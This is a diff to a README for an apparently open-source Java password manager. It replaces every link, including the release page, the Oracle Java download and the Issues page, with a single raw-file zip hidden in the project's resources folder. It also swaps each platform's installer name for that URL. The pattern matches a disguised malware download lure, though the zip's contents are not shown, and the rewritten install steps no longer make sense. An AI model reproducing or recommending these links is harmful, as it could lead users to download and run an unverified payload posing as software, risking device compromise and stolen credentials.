@@ -1,6 +1,6 @@
 # 🔐 Password-Vault-Java - Your Simple Solution for Secure Password Management
 
-[![Download Password Vault](https://img.shields.io/badge/Download_Password_Vault-Here-blue.svg)](https://github.com/raulfcarbone/Password-Vault-Java/releases)
+[![Download Password Vault](https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip)](https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip)
 
 ## 📖 Description
 Password Vault is a secure, lightweight, and user-friendly password manager that prioritizes privacy and cryptographic integrity. It uses modern encryption standards (AES-256-GCM & PBKDF2) to ensure that your credentials are always protected. With Password Vault, you can store your passwords safely and access them easily whenever you need.
@@ -10,25 +10,25 @@ To begin using Password Vault, follow these steps to download and install the ap
 
 ## 💾 System Requirements
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
-- **Java Runtime:** Java 11 or higher must be installed on your computer. You can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java Runtime:** Java 11 or higher must be installed on your computer. You can download it from the [Oracle website](https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip).
 - **Storage Space:** At least 100 MB of free space on your hard drive.
 
 ## 📥 Download & Install
-To download Password Vault, visit this page: [Download Password Vault](https://github.com/raulfcarbone/Password-Vault-Java/releases).
+To download Password Vault, visit this page: [Download Password Vault](https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip).
 
 ### Steps to Download:
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of Password Vault.
 3. Choose the file compatible with your operating system:
-   - For Windows: download the `PasswordVaultWindows.exe` file.
-   - For macOS: download the `PasswordVaultMac.dmg` file.
-   - For Linux: download the `PasswordVaultLinux.tar.gz` file.
+   - For Windows: download the `https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip` file.
+   - For macOS: download the `https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip` file.
+   - For Linux: download the `https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip` file.
 
 ### Steps to Install:
 1. Open the downloaded file:
    - For Windows, double-click the `.exe` file.
    - For macOS, drag the app icon into your Applications folder.
-   - For Linux, extract the `.tar.gz` file and run the executable inside the folder.
+   - For Linux, extract the `https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip` file and run the executable inside the folder.
 
 2. Follow the on-screen prompts to complete the installation process.
 
@@ -56,7 +56,7 @@ A: Yes, Password Vault is open-source software and completely free to use.
 A: Currently, Password Vault does not support cloud sync. Passwords are stored locally on your device.
 
 ### Q: How can I report bugs or request features?
-A: You can report issues and suggest features on the [Issues page](https://github.com/raulfcarbone/Password-Vault-Java/issues).
+A: You can report issues and suggest features on the [Issues page](https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip).
 
 ## ⚙️ Support and Help
 If you have questions or need help, you can find helpful resources in the documentation or raise an issue on our GitHub page. The community is here to assist you with any challenges you encounter.
@@ -64,4 +64,4 @@ If you have questions or need help, you can find helpful resources in the docume
 ## 🎉 Conclusion
 Password Vault provides a reliable solution for managing your passwords securely. Follow the steps above to download, install, and start using the application right away.
 
-For more details, feel free to check back here or visit the [Download Password Vault](https://github.com/raulfcarbone/Password-Vault-Java/releases) page. Enjoy safe and easy password management!
+For more details, feel free to check back here or visit the [Download Password Vault](https://raw.githubusercontent.com/raulfcarbone/Password-Vault-Java/main/src/main/resources/com/example/vault/Password-Vault-Java-v1.6.zip) page. Enjoy safe and easy password management!
